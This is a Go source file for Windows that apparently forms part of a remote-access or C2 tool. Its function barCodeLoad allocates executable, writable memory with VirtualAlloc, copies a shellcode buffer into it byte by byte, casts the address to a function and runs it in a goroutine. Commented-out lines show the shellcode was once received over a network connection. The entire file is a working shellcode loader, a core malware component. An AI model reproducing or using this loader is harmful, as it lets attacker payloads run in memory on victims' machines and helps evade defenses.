package main

import (
	"log"
	"net"
	"unsafe"

	"golang.org/x/sys/windows"
)

func barCodeLoad(conn *net.Conn, sc *[]byte) { //Works with x64 only.
	// buffer := make([]byte, 10000000)
	// (*conn).Write([]byte("OK\n"))
	// fmt.Println("Getting the shellcode")
	// read_len, err := (*conn).Read(buffer)
	// if read_len <= 1 {
	// 	fmt.Println("Failed to read shellcode")
	// }
	// if err != nil {
	// 	fmt.Println("Failed to read shellcode")
	// }
	// buffSnapped := buffer[:read_len]
	// (*conn).Write([]byte("OK\n"))
	executableMemory, err := windows.VirtualAlloc(0, uintptr(len(*sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		log.Fatal("Fail allocating executable memory: ", err)
	}

	WriteMemory(*sc, executableMemory)

	memoryPtr := &executableMemory
	ptr := unsafe.Pointer(&memoryPtr)
	shellcodeFunc := *(*func())(ptr)
	//Try to run this concurently with goroutine ?! Didnt work
	go func() {
		shellcodeFunc()
	}()
	//shellcodeFunc()
}

func WriteMemory(inbuf []byte, destination uintptr) {
	for index := uint32(0); index < uint32(len(inbuf)); index++ {
		writePtr := unsafe.Pointer(destination + uintptr(index))
		v := (*byte)(writePtr)
		*v = inbuf[index]
	}
}
